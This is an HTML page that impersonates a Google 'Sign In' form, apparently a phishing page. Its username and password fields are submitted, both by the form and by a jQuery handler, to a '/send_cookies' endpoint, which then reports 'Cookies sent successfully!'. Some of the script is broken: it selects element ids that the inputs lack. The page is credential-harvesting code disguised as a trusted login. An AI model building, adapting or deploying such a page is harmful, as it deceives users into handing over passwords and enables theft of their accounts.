
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap">

    <style>
        body {
            margin: 0;
            padding: 0;
            background-size: cover;
            font-family: 'Open Sans', sans-serif;
        }

        .box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 30rem;
            padding: 3.5rem;
            box-sizing: border-box;
            border: 1px solid #dadce0;
            border-radius: 0.312rem;
        }

        .box h2 {
            margin: 0px 0 -0.125rem;
            padding: 0;
            text-align: center;
            color: #202124;
            font-size: 24px;
            font-weight: 400;
        }

        .box .logo {
            height: 45px;
            display: flex;
            flex-direction: row;
            justify-content: center;
            margin-bottom: 1px;
        }

        .box p {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 1px;
            line-height: 1.5;
            margin-bottom: 24px;
            text-align: center;
        }

        .box .inputBox {
            position: relative;
        }

        .box .inputBox input {
            width: 93%;
            height: 10px;
            padding: 1.3rem 10px;
            font-size: 1rem;
            letter-spacing: 0.062rem;
            margin-bottom: 1.875rem;
            border: 1px solid #ccc;
            background: transparent;
            border-radius: 4px;
        }

        .box .inputBox label {
            position: absolute;
            top: 0;
            left: 10px;
            padding: 0.625rem 0;
            font-size: 1rem;
            color: gray;
            pointer-events: none;
            transition: 0.5s;
        }

        .box .inputBox input:focus ~ label,
        .box .inputBox input:valid ~ label,
        .box .inputBox input:not([value=""]) ~ label {
            top: -1.125rem;
            left: 10px;
            color: #1a73e8;
            font-size: 0.75rem;
            background-color: #fff;
            height: 10px;
            padding-left: 5px;
            padding-right: 5px;
        }

        .box .inputBox input:focus {
            outline: none;
            border: 2px solid #1a73e8;
        }

        .box input[type="submit"] {
            border: none;
            outline: none;
            color: #fff;
            background-color: #1a73e8;
            padding: 0.625rem 1.25rem;
            cursor: pointer;
            border-radius: 0.312rem;
            font-size: 1rem;
            float: right;
        }

        .box input[type="submit"]:hover {
            background-color: #287ae6;
            box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>

    <div id="myModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <div class="box">
                <div class="logo">
                    <img src="https://www.bing.com/th?id=OIP.arezqGrVeKUAmuKTaXGGEgHaEK&w=200&h=106&c=8&rs=1&qlt=90&o=6&dpr=1.3&pid=3.1&rm=2">
                </div>
                <h2>Sign In</h2>
                <p>Use your Google Account</p>
                <form id="loginForm" method="POST" action="/send_cookies">
                    <div class="inputBox">
                        <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
                        <label for="email">Username</label>
                    </div>
                    <div class="inputBox">
                        <input type="text" name="password" required onkeyup="this.setAttribute('value', this.value);" value="">
                        <label for="password">Password</label>
                    </div>
                    <input type="submit" name="sign-in" value="Sign In" class="submit-btn">
                </form>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            $("#sendCookiesButton").click(function() {
                $("#myModal").css("display", "block");
            });

            $(".close").click(function() {
                <!-- تكملة الكود -->
                $("#myModal").css("display", "none");
            });

            $("#loginForm").submit(function(event) {
                event.preventDefault();
                var email = $("#email").val();
                var password = $("#password").val();

                $.ajax({
                    url: "/send_cookies",
                    type: "POST",
                    data: { email: email, password: password },
                    success: function(response) {
                        alert("Cookies sent successfully!");
                        $("#myModal").css("display", "none");
                    },
                    error: function(error) {
                        alert("Error sending cookies.");
                    }
                });
            });
        });
    </script>

</body>
</html>
